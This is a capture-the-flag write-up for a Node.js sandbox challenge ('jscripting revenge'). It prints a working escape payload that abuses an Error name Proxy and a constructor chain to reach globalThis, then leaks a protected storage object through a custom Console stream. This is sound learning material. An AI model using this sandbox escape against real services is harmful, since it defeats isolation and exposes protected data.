# jscripting revenge

huge huge cheese

## problem

see [web_jscripting-revenge.7z](./web_jscripting-revenge.7z)

please read jscripting writeup before this

same as jscripting but there is some weird stuff

## solution

this time, there is no changing globalThis to have `globalThis.module.require = require` or whatever. however, the top of the worker.js file had some bytecode run first

```js
const { workerData, parentPort } = require('worker_threads');

require("./worker_globals.js");
const { runBytecodeFile } = require("./bytecode.js")

globalThis.require = require;

runBytecodeFile("./utils.jsc")();
```

i don't exactly know what it did since it was javascript bytecode. basically, i blackboxed this

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/35f74cfd-c660-464a-b016-3f7828563cbb)

we cant run our exploit from before

we can see what keys `globalThis` still has left by using `Object.keys(globalThis)`

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/7f1e9372-2cdb-4e20-9ca6-2357177e331e)

we have a `secureRequire`. hmmmmmm

so i tried running `secureRequire` with all of the module names that were whitelisted from the previous challenge, and all of them are allowed except for `util`.

essentially, the whitelist was:

```js
    const whitelist = [
        "crypto",
        "path",
        "buffer",
        "worker_threads",
        "stream",
        "string_decoder",
        "console",
        "perf_hooks"
    ];
```

one interesting thing i noticed was that the javascript console let me see the proxy object even though i cant read it from js code

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/3ad3b6b5-db3c-4c19-b355-d9cfe11bd15f)

i took a look at the `console` module in node.js docs to try to find a similar thing to just use debug functions on the flag

anyways, we have [console.dir](https://nodejs.org/docs/latest/api/console.html#consoledirobj-options)

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/dec5735a-c5f7-4150-8490-7d46fc20974f)

hey, our old friend `util.inspect`! however, it prints this to stdout, which we cant read.

the solution is to create our own Console object and then use `.dir` on it to get it to a stream we control.

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/f5f8759c-ca01-4710-8db7-b3dada5a78f8)

we can do this because `secureRequire('stream')` is allowed, so we can just create streams as we want

here is the idea:
```js
let q = e.secureRequire;
let total = "";
let readable = q("stream").Readable({read(size) {}});
let writable = q("stream").Writable({write(chunk, encoding, callback) {total += chunk.toString(); callback();}});
readable.pipe(writable);
readable.on('data', chunk => {
  total += chunk.toString();
});
new q("console").Console(writable).dir(e.storage);
return total;
```

here, `e` is the `globalThis` object.

putting this into our payload template:

```js
(() => {const err = new Error();err.name = {toString: new Proxy(() => "", {apply(target, thiz, args) {const process = args.constructor.constructor("return globalThis")();throw process;},}),};try{err.stack;}catch(e){    
  let q = e.secureRequire;
  let total = "";
  let readable = q("stream").Readable({read(size) {}});
  let writable = q("stream").Writable({write(chunk, encoding, callback) {total += chunk.toString(); callback();}});
  readable.pipe(writable);
  readable.on('data', chunk => {  total += chunk.toString();});
  new q("console").Console(writable).dir(e.storage);
  return [...total];     
}})()
```

and we get the flag

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/1a3c3e54-189a-4bb8-913a-d44f113db54a)

i think the intended was to rev the `jsc` file or whatever but idk how to do that so oh well
